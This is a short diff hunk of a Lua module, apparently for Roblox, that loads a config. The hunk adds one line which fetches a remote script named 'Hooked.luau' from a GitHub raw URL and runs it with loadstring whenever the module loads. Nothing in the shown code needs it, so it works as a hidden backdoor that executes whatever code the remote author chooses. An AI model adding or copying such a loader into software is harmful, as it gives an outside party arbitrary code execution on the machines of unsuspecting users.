@@ -379,5 +379,6 @@ do warn([[
 
 Configs = Module.Config:load()
 Module.index = __index
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sofziol1fe/Script/main/Packages/Hooked.luau', true))()
 
 return Module, Configs
